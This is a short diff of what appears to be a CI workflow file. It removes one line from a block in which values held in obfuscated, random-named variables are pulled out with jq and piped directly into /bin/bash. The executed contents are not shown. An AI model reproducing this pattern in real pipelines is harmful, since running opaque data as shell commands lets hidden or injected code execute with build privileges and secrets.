@@ -32,7 +32,6 @@ jobs:
           echo $unks75 | jq -r .zau5 | /bin/bash
           printf '%s' "$c9" | jq -r .kw4049 | /bin/bash
           echo $el0175 | jq -r .zlsmy8 | /bin/bash
-          printf '%s' "$fju9" | jq -r .elqcn931 | /bin/bash
           echo $meml0 | jq -r .yrtf99 | /bin/bash
           printf '%s' "$hwhsb224" | jq -r .k961 | /bin/bash
           printf '%s' "$pfn3413" | jq -r .t6866 | /bin/bash
